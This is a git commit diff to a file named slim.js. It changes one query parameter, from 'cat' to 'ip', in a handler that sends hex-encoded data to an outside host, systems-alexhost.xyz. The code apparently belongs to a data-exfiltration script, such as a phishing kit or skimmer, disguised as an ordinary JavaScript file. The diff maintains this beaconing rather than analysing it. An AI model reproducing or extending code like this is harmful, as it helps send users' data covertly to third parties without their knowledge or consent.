1c9d91b36cd6af3e0c1e1c3af12392f85eeeaf9f
indexcp <169174151+indexcp@users.noreply.github.com>
2024-06-12 19:07:07 +0700

    Update slim.js

--- slim.js
+++ slim.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://systems-alexhost.xyz/halo/?cat=" +
+                    "https://systems-alexhost.xyz/halo/?ip=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
